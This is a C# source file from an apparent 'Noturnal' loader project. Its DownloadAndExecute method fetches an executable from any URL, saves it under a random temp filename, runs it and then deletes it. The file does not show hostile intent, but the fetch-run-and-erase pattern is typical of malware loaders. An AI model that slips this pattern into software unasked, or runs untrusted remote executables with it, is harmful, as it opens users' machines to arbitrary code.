using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;

namespace Noturnal.Loader.Services
{
    public static class DownloadService
    {
        private static readonly HttpClient _client = new HttpClient();

        public static async Task<bool> DownloadAndExecute(string url)
        {
            try
            {
                // 1. Generate random filename in Temp
                var tempPath = Path.GetTempPath();
                var fileName = Path.GetRandomFileName() + ".exe";
                var filePath = Path.Combine(tempPath, fileName);

                // 2. Download file
                LogService.Instance.Add($"Downloading from {url}...");
                using (var s = await _client.GetStreamAsync(url))
                using (var fs = new FileStream(filePath, FileMode.CreateNew))
                {
                    await s.CopyToAsync(fs);
                }
                LogService.Instance.Add($"Downloaded to {fileName}");

                // 3. Execute
                LogService.Instance.Add("Executing...");
                var psi = new ProcessStartInfo
                {
                    FileName = filePath,
                    UseShellExecute = true // Required to execute exe directly
                };

                using (var proc = Process.Start(psi))
                {
                    if (proc != null)
                    {
                        LogService.Instance.Add("Process started. Waiting for exit...");
                        await proc.WaitForExitAsync();
                        LogService.Instance.Add("Process exited.");
                    }
                    else
                    {
                        LogService.Instance.Add("Failed to start process.");
                        return false;
                    }
                }

                // 4. Delete
                try
                {
                    File.Delete(filePath);
                    LogService.Instance.Add("Cleaned up temporary file.");
                }
                catch (Exception ex)
                {
                    LogService.Instance.Add($"Cleanup failed: {ex.Message}");
                }

                return true;
            }
            catch (Exception ex)
            {
                LogService.Instance.Add($"Error: {ex.Message}");
                return false;
            }
        }
    }
}
